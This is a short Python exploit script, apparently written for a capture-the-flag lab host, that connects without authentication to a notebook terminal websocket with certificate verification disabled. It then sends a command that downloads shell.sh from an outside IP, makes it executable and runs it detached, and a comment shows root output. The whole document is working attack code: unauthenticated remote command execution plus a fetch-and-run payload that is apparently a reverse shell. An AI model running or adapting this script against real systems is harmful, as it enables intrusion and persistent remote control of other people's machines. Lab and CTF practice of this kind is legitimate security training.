import websocket
import ssl
import time

# Connect without any authentication
ws = websocket.WebSocket(sslopt={"cert_reqs": ssl.CERT_NONE})
ws.connect('wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws')
time.sleep(2)

# Drain initial output
try:
    while True:
        ws.settimeout(1)
        ws.recv()
except:
    pass

# Execute arbitrary command
ws.settimeout(10)
ws.send("wget http://10.10.14.234:8000/shell.sh && chmod +x shell.sh && setsid nohup ./shell.sh < /dev/null > /dev/null 2>&1 & disown\n")
time.sleep(2)
print(ws.recv())  # uid=0(root) gid=0(root) groups=0(root)
ws.close()

